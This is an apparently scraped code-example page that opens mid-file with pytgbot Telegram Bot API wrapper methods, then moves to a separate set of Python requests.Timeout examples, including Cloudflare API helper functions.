        On success, if edited message is sent by the bot, the edited Message is returned, otherwise True is returned.

        https://core.telegram.org/bots/api#editmessagereplymarkup


        Optional keyword parameters:

        :param chat_id: Required if inline_message_id is not specified. Unique identifier for the target chat or
                          username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode

        :param message_id: Required if inline_message_id is not specified. Identifier of the sent message
        :type  message_id: int

        :param inline_message_id: Required if chat_id and message_id are not specified.
                                    Identifier of the inline message
        :type  inline_message_id: str|unicode

        :param reply_markup: A JSON-serialized object for an inline keyboard.
        :type  reply_markup: pytgbot.api_types.sendable.reply_markup.InlineKeyboardMarkup

        Returns:

        :return: On success, if edited message is sent by the bot, the edited Message is returned, otherwise True is returned
        :rtype:  pytgbot.api_types.receivable.updates.Message | bool
        """
        from pytgbot.api_types.sendable.reply_markup import InlineKeyboardMarkup

        assert_type_or_raise(chat_id, None, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(message_id, None, int, parameter_name="message_id")

        assert_type_or_raise(inline_message_id, None, unicode_type, parameter_name="inline_message_id")

        assert_type_or_raise(reply_markup, None, InlineKeyboardMarkup, parameter_name="reply_markup")

        result = self.do(
            "editMessageReplyMarkup", chat_id=chat_id, message_id=message_id, inline_message_id=inline_message_id,
            reply_markup=reply_markup
        )
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import Message
            try:
                return Message.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Message", exc_info=True)
            # end try
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def edit_message_reply_markup 
**************************************
def add_sticker_to_set(self, user_id, name, png_sticker, emojis, mask_position=None):
        """
        Use this method to add a new sticker to a set created by the bot. Returns True on success.

        https://core.telegram.org/bots/api#addstickertoset


        Parameters:

        :param user_id: User identifier of sticker set owner
        :type  user_id: int

        :param name: Sticker set name
        :type  name: str|unicode

        :param png_sticker: Png image with the sticker, must be up to 512 kilobytes in size, dimensions must not exceed 512px, and either width or height must be exactly 512px. Pass a file_id as a String to send a file that already exists on the Telegram servers, pass an HTTP URL as a String for Telegram to get a file from the Internet, or upload a new one using multipart/form-data.
        :type  png_sticker: pytgbot.api_types.sendable.files.InputFile | str|unicode

        :param emojis: One or more emoji corresponding to the sticker
        :type  emojis: str|unicode


        Optional keyword parameters:

        :param mask_position: A JSON-serialized object for position where the mask should be placed on faces
        :type  mask_position: pytgbot.api_types.receivable.stickers.MaskPosition

        Returns:

        :return: Returns True on success
        :rtype: bool
        """
        from pytgbot.api_types.receivable.stickers import MaskPosition
        from pytgbot.api_types.sendable.files import InputFile

        assert_type_or_raise(user_id, int, parameter_name="user_id")

        assert_type_or_raise(name, unicode_type, parameter_name="name")

        assert_type_or_raise(png_sticker, (InputFile, unicode_type), parameter_name="png_sticker")

        assert_type_or_raise(emojis, unicode_type, parameter_name="emojis")

        assert_type_or_raise(mask_position, None, MaskPosition, parameter_name="mask_position")

        result = self.do("addStickerToSet", user_id=user_id, name=name, png_sticker=png_sticker, emojis=emojis, mask_position=mask_position)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def add_sticker_to_set 
**************************************
def answer_pre_checkout_query(self, pre_checkout_query_id, ok, error_message=None):
        """
        Once the user has confirmed their payment and shipping details, the Bot API sends the final confirmation in the form of an Update with the field pre_checkout_query. Use this method to respond to such pre-checkout queries. On success, True is returned. Note: The Bot API must receive an answer within 10 seconds after the pre-checkout query was sent.

        https://core.telegram.org/bots/api#answerprecheckoutquery


        Parameters:

        :param pre_checkout_query_id: Unique identifier for the query to be answered
        :type  pre_checkout_query_id: str|unicode

        :param ok: Specify True if everything is alright (goods are available, etc.) and the bot is ready to proceed with the order. Use False if there are any problems.
        :type  ok: bool


        Optional keyword parameters:

        :param error_message: Required if ok is False. Error message in human readable form that explains the reason for failure to proceed with the checkout (e.g. "Sorry, somebody just bought the last of our amazing black T-shirts while you were busy filling out your payment details. Please choose a different color or garment!"). Telegram will display this message to the user.
        :type  error_message: str|unicode

        Returns:

        :return: On success, True is returned
        :rtype:  bool
        """
        assert_type_or_raise(pre_checkout_query_id, unicode_type, parameter_name="pre_checkout_query_id")

        assert_type_or_raise(ok, bool, parameter_name="ok")

        assert_type_or_raise(error_message, None, unicode_type, parameter_name="error_message")

        result = self.do("answerPreCheckoutQuery", pre_checkout_query_id=pre_checkout_query_id, ok=ok, error_message=error_message)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def answer_pre_checkout_query 
**************************************
def send_game(self, chat_id, game_short_name, disable_notification=None, reply_to_message_id=None,
                  reply_markup=None):
        """
        Use this method to send a game. On success, the sent Message is returned.

        https://core.telegram.org/bots/api#sendgame


        Parameters:

        :param chat_id: Unique identifier for the target chat
        :type  chat_id: int

        :param game_short_name: Short name of the game, serves as the unique identifier for the game. Set up your games via Botfather.
        :type  game_short_name: str|unicode


        Optional keyword parameters:

        :param disable_notification: Sends the message silently. Users will receive a notification with no sound.
        :type  disable_notification: bool

        :param reply_to_message_id: If the message is a reply, ID of the original message
        :type  reply_to_message_id: int

        :param reply_markup: A JSON-serialized object for an inline keyboard. If empty, one ‘Play game_title’ button will be shown. If not empty, the first button must launch the game.
        :type  reply_markup: pytgbot.api_types.sendable.reply_markup.InlineKeyboardMarkup

        Returns:

        :return: On success, the sent Message is returned
        :rtype:  pytgbot.api_types.receivable.updates.Message
        """
        from pytgbot.api_types.sendable.reply_markup import InlineKeyboardMarkup

        assert_type_or_raise(chat_id, int, parameter_name="chat_id")

        assert_type_or_raise(game_short_name, unicode_type, parameter_name="game_short_name")

        assert_type_or_raise(disable_notification, None, bool, parameter_name="disable_notification")

        assert_type_or_raise(reply_to_message_id, None, int, parameter_name="reply_to_message_id")

        assert_type_or_raise(reply_markup, None, InlineKeyboardMarkup, parameter_name="reply_markup")

        result = self.do("sendGame", chat_id=chat_id, game_short_name=game_short_name, disable_notification=disable_notification, reply_to_message_id=reply_to_message_id, reply_markup=reply_markup)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import Message
            try:
                return Message.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Message", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def send_game 
**************************************
def get_game_high_scores(self, user_id, chat_id=None, message_id=None, inline_message_id=None):
        """
        Use this method to get data for high score tables. Will return the score of the specified user and several of his neighbors in a game. On success, returns an Array of GameHighScore objects.

        This method will currently return scores for the target user, plus two of his closest neighbors on each side. Will also return the top three users if the user and his neighbors are not among them. Please note that this behavior is subject to change.

        https://core.telegram.org/bots/api#getgamehighscores


        Parameters:

        :param user_id: Target user id
        :type  user_id: int


        Optional keyword parameters:

        :param chat_id: Required if inline_message_id is not specified. Unique identifier for the target chat
        :type  chat_id: int

        :param message_id: Required if inline_message_id is not specified. Identifier of the sent message
        :type  message_id: int

        :param inline_message_id: Required if chat_id and message_id are not specified. Identifier of the inline message
        :type  inline_message_id: str|unicode

        Returns:

        :return: On success, returns an Array of GameHighScore objects
        :rtype:  list of pytgbot.api_types.receivable.game.GameHighScore
        """
        assert_type_or_raise(user_id, int, parameter_name="user_id")

        assert_type_or_raise(chat_id, None, int, parameter_name="chat_id")

        assert_type_or_raise(message_id, None, int, parameter_name="message_id")

        assert_type_or_raise(inline_message_id, None, unicode_type, parameter_name="inline_message_id")

        result = self.do("getGameHighScores", user_id=user_id, chat_id=chat_id, message_id=message_id, inline_message_id=inline_message_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.game import GameHighScore
            try:
                return GameHighScore.from_array_list(result, list_level=1)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type GameHighScore", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_game_high_scores 
**************************************
def get_updates(self, offset=None, limit=None, timeout=None, allowed_updates=None):
        """
        Use this method to receive incoming updates using long polling (wiki). An Array of Update objects is returned.

        Notes1. This method will not work if an outgoing webhook is set up.2. In order to avoid getting duplicate updates, recalculate offset after each server response.


        https://core.telegram.org/bots/api#getupdates

        
        Optional keyword parameters:
        
        :param offset: Identifier of the first update to be returned. Must be greater by one than the highest among the identifiers of previously received updates. By default, updates starting with the earliest unconfirmed update are returned. An update is considered confirmed as soon as getUpdates is called with an offset higher than its update_id. The negative offset can be specified to retrieve updates starting from -offset update from the end of the updates queue. All previous updates will forgotten.
        :type  offset: int
        
        :param limit: Limits the number of updates to be retrieved. Values between 1—100 are accepted. Defaults to 100.
        :type  limit: int
        
        :param timeout: Timeout in seconds for long polling. Defaults to 0, i.e. usual short polling. Should be positive, short polling should be used for testing purposes only.
        :type  timeout: int
        
        :param allowed_updates: List the types of updates you want your bot to receive. For example, specify [“message”, “edited_channel_post”, “callback_query”] to only receive updates of these types. See Update for a complete list of available update types. Specify an empty list to receive all updates regardless of type (default). If not specified, the previous setting will be used.Please note that this parameter doesn't affect updates created before the call to the getUpdates, so unwanted updates may be received for a short period of time.
        :type  allowed_updates: list of str|unicode
        
        Returns:

        :return: An Array of Update objects is returned
        :rtype:  list of pytgbot.api_types.receivable.updates.Update
        """
        assert_type_or_raise(offset, None, int, parameter_name="offset")
        
        assert_type_or_raise(limit, None, int, parameter_name="limit")
        
        assert_type_or_raise(timeout, None, int, parameter_name="timeout")
        
        assert_type_or_raise(allowed_updates, None, list, parameter_name="allowed_updates")
        
        result = self.do("getUpdates", offset=offset, limit=limit, timeout=timeout, allowed_updates=allowed_updates)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import Update
            try:
                return Update.from_array_list(result, list_level=1)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Update", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_updates 
**************************************
def set_webhook(self, url, certificate=None, max_connections=None, allowed_updates=None):
        """
        Use this method to specify a url and receive incoming updates via an outgoing webhook. Whenever there is an update for the bot, we will send an HTTPS POST request to the specified url, containing a JSON-serialized Update. In case of an unsuccessful request, we will give up after a reasonable amount of attempts. Returns True on success.
        If you'd like to make sure that the Webhook request comes from Telegram, we recommend using a secret path in the URL, e.g. https://www.example.com/<token>. Since nobody else knows your bot‘s token, you can be pretty sure it’s us.

        Notes1. You will not be able to receive updates using getUpdates for as long as an outgoing webhook is set up.2. To use a self-signed certificate, you need to upload your public key certificate using certificate parameter. Please upload as InputFile, sending a String will not work.3. Ports currently supported for Webhooks: 443, 80, 88, 8443.
        NEW! If you're having any trouble setting up webhooks, please check out this amazing guide to Webhooks.


        https://core.telegram.org/bots/api#setwebhook

        
        Parameters:
        
        :param url: HTTPS url to send updates to. Use an empty string to remove webhook integration
        :type  url: str|unicode
        
        
        Optional keyword parameters:
        
        :param certificate: Upload your public key certificate so that the root certificate in use can be checked. See our self-signed guide for details.
        :type  certificate: pytgbot.api_types.sendable.files.InputFile
        
        :param max_connections: Maximum allowed number of simultaneous HTTPS connections to the webhook for update delivery, 1-100. Defaults to 40. Use lower values to limit the load on your bot‘s server, and higher values to increase your bot’s throughput.
        :type  max_connections: int
        
        :param allowed_updates: List the types of updates you want your bot to receive. For example, specify [“message”, “edited_channel_post”, “callback_query”] to only receive updates of these types. See Update for a complete list of available update types. Specify an empty list to receive all updates regardless of type (default). If not specified, the previous setting will be used.Please note that this parameter doesn't affect updates created before the call to the setWebhook, so unwanted updates may be received for a short period of time.
        :type  allowed_updates: list of str|unicode
        
        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        from pytgbot.api_types.sendable.files import InputFile
        
        assert_type_or_raise(url, unicode_type, parameter_name="url")
        
        assert_type_or_raise(certificate, None, InputFile, parameter_name="certificate")
        
        assert_type_or_raise(max_connections, None, int, parameter_name="max_connections")
        
        assert_type_or_raise(allowed_updates, None, list, parameter_name="allowed_updates")
        
        result = self.do("setWebhook", url=url, certificate=certificate, max_connections=max_connections, allowed_updates=allowed_updates)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def set_webhook 
**************************************
def forward_message(self, chat_id, from_chat_id, message_id, disable_notification=None):
        """
        Use this method to forward messages of any kind. On success, the sent Message is returned.

        https://core.telegram.org/bots/api#forwardmessage

        
        Parameters:
        
        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode
        
        :param from_chat_id: Unique identifier for the chat where the original message was sent (or channel username in the format @channelusername)
        :type  from_chat_id: int | str|unicode
        
        :param message_id: Message identifier in the chat specified in from_chat_id
        :type  message_id: int
        
        
        Optional keyword parameters:
        
        :param disable_notification: Sends the message silently. Users will receive a notification with no sound.
        :type  disable_notification: bool
        
        Returns:

        :return: On success, the sent Message is returned
        :rtype:  pytgbot.api_types.receivable.updates.Message
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        assert_type_or_raise(from_chat_id, (int, unicode_type), parameter_name="from_chat_id")
        
        assert_type_or_raise(message_id, int, parameter_name="message_id")
        
        assert_type_or_raise(disable_notification, None, bool, parameter_name="disable_notification")
        
        result = self.do("forwardMessage", chat_id=chat_id, from_chat_id=from_chat_id, message_id=message_id, disable_notification=disable_notification)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import Message
            try:
                return Message.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Message", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def forward_message 
**************************************
def send_media_group(self, chat_id, media, disable_notification=None, reply_to_message_id=None):
        """
        Use this method to send a group of photos or videos as an album. On success, an array of the sent Messages is returned.

        https://core.telegram.org/bots/api#sendmediagroup

        
        Parameters:
        
        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode
        
        :param media: A JSON-serialized array describing photos and videos to be sent, must include 2–10 items
        :type  media: list of pytgbot.api_types.sendable.input_media.InputMediaPhoto | list of pytgbot.api_types.sendable.input_media.InputMediaVideo
        
        
        Optional keyword parameters:
        
        :param disable_notification: Sends the messages silently. Users will receive a notification with no sound.
        :type  disable_notification: bool
        
        :param reply_to_message_id: If the messages are a reply, ID of the original message
        :type  reply_to_message_id: int
        
        Returns:

        :return: On success, an array of the sent Messages is returned
        :rtype:  list of pytgbot.api_types.receivable.updates.Message
        """
        from pytgbot.api_types.sendable.input_media import InputMediaPhoto
        from pytgbot.api_types.sendable.input_media import InputMediaVideo
        
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        assert_type_or_raise(media, (list, list), parameter_name="media")
        
        assert_type_or_raise(disable_notification, None, bool, parameter_name="disable_notification")
        
        assert_type_or_raise(reply_to_message_id, None, int, parameter_name="reply_to_message_id")
        
        result = self.do("sendMediaGroup", chat_id=chat_id, media=media, disable_notification=disable_notification, reply_to_message_id=reply_to_message_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import Message
            try:
                return Message.from_array_list(result, list_level=1)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Message", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def send_media_group 
**************************************
def stop_message_live_location(self, chat_id=None, message_id=None, inline_message_id=None, reply_markup=None):
        """
        Use this method to stop updating a live location message before live_period expires. On success, if the message was sent by the bot, the sent Message is returned, otherwise True is returned.

        https://core.telegram.org/bots/api#stopmessagelivelocation

        
        Optional keyword parameters:
        
        :param chat_id: Required if inline_message_id is not specified. Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode
        
        :param message_id: Required if inline_message_id is not specified. Identifier of the message with live location to stop
        :type  message_id: int
        
        :param inline_message_id: Required if chat_id and message_id are not specified. Identifier of the inline message
        :type  inline_message_id: str|unicode
        
        :param reply_markup: A JSON-serialized object for a new inline keyboard.
        :type  reply_markup: pytgbot.api_types.sendable.reply_markup.InlineKeyboardMarkup
        
        Returns:

        :return: On success, if the message was sent by the bot, the sent Message is returned, otherwise True is returned
        :rtype:  pytgbot.api_types.receivable.updates.Message | bool
        """
        from pytgbot.api_types.sendable.reply_markup import InlineKeyboardMarkup
        
        assert_type_or_raise(chat_id, None, (int, unicode_type), parameter_name="chat_id")
        
        assert_type_or_raise(message_id, None, int, parameter_name="message_id")
        
        assert_type_or_raise(inline_message_id, None, unicode_type, parameter_name="inline_message_id")
        
        assert_type_or_raise(reply_markup, None, InlineKeyboardMarkup, parameter_name="reply_markup")
        
        result = self.do("stopMessageLiveLocation", chat_id=chat_id, message_id=message_id, inline_message_id=inline_message_id, reply_markup=reply_markup)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import Message
            try:
                return Message.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Message", exc_info=True)
            # end try
        
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def stop_message_live_location 
**************************************
def send_chat_action(self, chat_id, action):
        """
        Use this method when you need to tell the user that something is happening on the bot's side. The status is set for 5 seconds or less (when a message arrives from your bot, Telegram clients clear its typing status). Returns True on success.

        Example: The ImageBot needs some time to process a request and upload the image. Instead of sending a text message along the lines of "Retrieving image, please wait…", the bot may use sendChatAction with action = upload_photo. The user will see a "sending photo" status for the bot.

        We only recommend using this method when a response from the bot will take a noticeable amount of time to arrive.

        https://core.telegram.org/bots/api#sendchataction

        
        Parameters:
        
        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode
        
        :param action: Type of action to broadcast. Choose one, depending on what the user is about to receive: typing for text messages, upload_photo for photos, record_video or upload_video for videos, record_audio or upload_audio for audio files, upload_document for general files, find_location for location data, record_video_note or upload_video_note for video notes.
        :type  action: str|unicode
        
        
        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        assert_type_or_raise(action, unicode_type, parameter_name="action")
        
        result = self.do("sendChatAction", chat_id=chat_id, action=action)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def send_chat_action 
**************************************
def get_user_profile_photos(self, user_id, offset=None, limit=None):
        """
        Use this method to get a list of profile pictures for a user. Returns a UserProfilePhotos object.

        https://core.telegram.org/bots/api#getuserprofilephotos

        
        Parameters:
        
        :param user_id: Unique identifier of the target user
        :type  user_id: int
        
        
        Optional keyword parameters:
        
        :param offset: Sequential number of the first photo to be returned. By default, all photos are returned.
        :type  offset: int
        
        :param limit: Limits the number of photos to be retrieved. Values between 1—100 are accepted. Defaults to 100.
        :type  limit: int
        
        Returns:

        :return: Returns a UserProfilePhotos object
        :rtype:  pytgbot.api_types.receivable.media.UserProfilePhotos
        """
        assert_type_or_raise(user_id, int, parameter_name="user_id")
        
        assert_type_or_raise(offset, None, int, parameter_name="offset")
        
        assert_type_or_raise(limit, None, int, parameter_name="limit")
        
        result = self.do("getUserProfilePhotos", user_id=user_id, offset=offset, limit=limit)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.media import UserProfilePhotos
            try:
                return UserProfilePhotos.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type UserProfilePhotos", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_user_profile_photos 
**************************************
def kick_chat_member(self, chat_id, user_id, until_date=None):
        """
        Use this method to kick a user from a group, a supergroup or a channel. In the case of supergroups and channels, the user will not be able to return to the group on their own using invite links, etc., unless unbanned first. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Returns True on success.

        Note: In regular groups (non-supergroups), this method will only work if the ‘All Members Are Admins’ setting is off in the target group. Otherwise members may only be removed by the group's creator or by the member that added them.


        https://core.telegram.org/bots/api#kickchatmember

        
        Parameters:
        
        :param chat_id: Unique identifier for the target group or username of the target supergroup or channel (in the format @channelusername)
        :type  chat_id: int | str|unicode
        
        :param user_id: Unique identifier of the target user
        :type  user_id: int
        
        
        Optional keyword parameters:
        
        :param until_date: Date when the user will be unbanned, unix time. If user is banned for more than 366 days or less than 30 seconds from the current time they are considered to be banned forever
        :type  until_date: int
        
        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        assert_type_or_raise(user_id, int, parameter_name="user_id")
        
        assert_type_or_raise(until_date, None, int, parameter_name="until_date")
        
        result = self.do("kickChatMember", chat_id=chat_id, user_id=user_id, until_date=until_date)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def kick_chat_member 
**************************************
def restrict_chat_member(self, chat_id, user_id, permissions, until_date=None):
        """
        Use this method to restrict a user in a supergroup. The bot must be an administrator in the supergroup for this to work and must have the appropriate admin rights. Pass True for all permissions to lift restrictions from a user. Returns True on success.

        https://core.telegram.org/bots/api#restrictchatmember

        
        Parameters:
        
        :param chat_id: Unique identifier for the target chat or username of the target supergroup (in the format @supergroupusername)
        :type  chat_id: int | str|unicode
        
        :param user_id: Unique identifier of the target user
        :type  user_id: int
        
        :param permissions: New user permissions
        :type  permissions: pytgbot.api_types.receivable.peer.ChatPermissions
        
        
        Optional keyword parameters:
        
        :param until_date: Date when restrictions will be lifted for the user, unix time. If user is restricted for more than 366 days or less than 30 seconds from the current time, they are considered to be restricted forever
        :type  until_date: int
        
        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        from pytgbot.api_types.receivable.peer import ChatPermissions
        
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        assert_type_or_raise(user_id, int, parameter_name="user_id")
        
        assert_type_or_raise(permissions, ChatPermissions, parameter_name="permissions")
        
        assert_type_or_raise(until_date, None, int, parameter_name="until_date")
        
        result = self.do("restrictChatMember", chat_id=chat_id, user_id=user_id, permissions=permissions, until_date=until_date)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def restrict_chat_member 

Python requests.Timeout() Examples

**************************************
def test_authentication(self):
        try:
            resp = self.get('account/', op='list_authorisation_tokens')
        except requests.Timeout:
            raise errors.TransientDriverError("Timeout connection to MaaS")
        except Exception as ex:
            raise errors.PersistentDriverError(
                "Error accessing MaaS: %s" % str(ex))

        if resp.status_code in [401, 403]:
            raise errors.PersistentDriverError(
                "MaaS API Authentication Failed")

        if resp.status_code in [500, 503]:
            raise errors.TransientDriverError("Received 50x error from MaaS")

        if resp.status_code != 200:
            raise errors.PersistentDriverError(
                "Received unexpected error from MaaS")

        return True 
**************************************
def _request(self, url, refresh=False, **params):
        if self.using_cache and refresh is False:  # refresh=True forces a request instead of using cache
            cache = self._resolve_cache(url, **params)
            if cache is not None:
                return cache
        method = params.get('method', 'GET')
        json_data = params.get('json', {})
        timeout = params.pop('timeout', None) or self.timeout
        if self.is_async:  # return a coroutine
            return self._arequest(url, **params)
        try:
            with self.session.request(
                method, url, timeout=timeout, headers=self.headers, params=params, json=json_data
            ) as resp:
                return self._raise_for_status(resp, resp.text, method=method)
        except requests.Timeout:
            raise NotResponding
        except requests.ConnectionError:
            raise NetworkError 
**************************************
def _request(self, url, refresh=False, **params):
        if self.using_cache and refresh is False:  # refresh=True forces a request instead of using cache
            cache = self._resolve_cache(url, **params)
            if cache is not None:
                return cache
        if self.ratelimit[1] == 0 and time() < self.ratelimit[2] / 1000:
            if not url.endswith('/auth/stats'):
                raise RatelimitErrorDetected(self.ratelimit[2] / 1000 - time())
        if self.is_async:  # return a coroutine
            return self._arequest(url, **params)
        timeout = params.pop('timeout', None) or self.timeout
        try:
            with self.session.get(url, timeout=timeout, headers=self.headers, params=params) as resp:
                return self._raise_for_status(resp, resp.text, method='GET')
        except requests.Timeout:
            raise NotResponding
        except requests.ConnectionError:
            raise NetworkError 
**************************************
def process_response(wrapped, instance, args, kwargs):
    """
    Decorator to process requests.Response

    Raises:
        Exception: Service Unavailable

    Returns:
        dict: json data
    """

    try:
        resp = wrapped(*args, **kwargs)

    except (requests.ConnectionError, requests.Timeout) as e:
        raise Exception("Service Unavailable") from e

    else:
        resp.raise_for_status()
        return resp.json() 
**************************************
def api_call_get(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.get(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_post(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.post(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_delete(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.delete(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if not api_result['success']:
            raise self.APIError(api_result['errors'])
        return api_result 
**************************************
def api_call_patch(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.patch(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_put(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.put(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        elif api_result['errors']:
            raise self.APIError(str(api_result['errors']))
        return api_result

    ################################################################
    #  Zone (https://api.cloudflare.com/#zone)                     #
    ################################################################

    #  Get all zones 
**************************************
